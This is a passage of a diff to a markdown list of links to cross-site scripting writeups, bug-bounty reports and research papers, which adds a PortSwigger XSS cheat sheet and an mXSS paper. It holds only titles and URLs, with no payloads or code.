 - [XSSI, Client Side Brute Force](http://blog.intothesymmetry.com/2017/05/cross-origin-brute-forcing-of-saml-and.html)  
+- [postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)
 - [postMessage XSS Bypass](https://hackerone.com/reports/231053)
 - [XSS in Uber via Cookie](http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/) by zhchbin
 - [Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) by frans
@@ -947,3 +1106,5 @@ Try here : [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php
 - [XSS in www.yahoo.com](https://www.youtube.com/watch?v=d9UEVv3cJ0Q&feature=youtu.be) 
 - [Stored XSS, and SSRF in Google using the Dataset Publishing Language](https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html)
 - [Stored XSS on Snapchat](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
+- [XSS cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+- [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang](https://cure53.de/fp170.pdf)
